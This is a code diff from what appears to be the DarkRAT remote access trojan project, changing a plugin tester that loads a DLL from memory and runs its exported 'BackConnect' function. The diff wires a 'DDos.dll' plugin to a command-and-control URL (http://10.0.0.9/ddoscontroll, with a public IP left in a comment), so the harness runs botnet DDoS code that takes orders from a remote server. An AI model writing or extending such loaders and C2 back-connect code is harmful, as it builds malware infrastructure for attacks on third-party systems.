@@ -4,6 +4,7 @@
 #include <Windows.h>
 #include <urlmon.h>
 #include <string>
+#include <iostream>
 #pragma comment (lib, "urlmon.lib")
 
 typedef void(_cdecl* func)(std::string test);
@@ -13,16 +14,51 @@ typedef void(_cdecl* func)(std::string test);
 //Removed for Commit
 //unsigned char rawData[36864] = {}
 
+std::string getCurrentDirectoryOnWindows()
+{
+	const unsigned long maxDir = 260;
+	char currentDir[maxDir];
+	GetCurrentDirectory(maxDir, (LPWSTR)currentDir);
+	return std::string(currentDir);
+}
 
-int _tmain(int argc, _TCHAR* argv[])
+
+int main()
 {
 	CLoad lib;
 	HANDLE hLibrary = 0;
 
-	//hLibrary = lib.LoadFromMemory(test, sizeof(test)); // loaded the dll from byte array.
-	hLibrary = lib.LoadFromFile("C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\Debug\\ExampleTask.dll"); // loaded the dll from byte array.
-	func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "DisplayHelloFromDLL");
-	fn("");
+	//hLibrary = lib.LoadFromFile("C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\Debug\\ExampleTask.dll"); // loaded the dll from byte array.
+	//func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "DisplayHelloFromDLL");
+	/*
+	hLibrary = lib.LoadFromFile("C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\Debug\\DDos.dll"); // loaded the dll from byte array.
+	func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "BackConnect");
+	fn("http://35.204.128.99/ddoscontroll");
 	lib.FreeLibraryFromMemory(hLibrary);
-	return 0;
+	*/
+
+
+	std::string folder = "";
+#if _DEBUG
+	folder = "Debug";
+#endif
+#if NDEBUG 
+    folder = "Release";
+#endif
+
+
+
+
+	std::string dir = "DDos.dll";
+
+	//std::cout << dir;
+	hLibrary = lib.LoadFromFile(dir.c_str()); // loaded the dll from byte array.
+	func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "BackConnect");
+	fn("http://10.0.0.9/ddoscontroll");
+	//lib.FreeLibraryFromMemory(hLibrary);
+
+	while (true)
+	{
+
+	}
 }
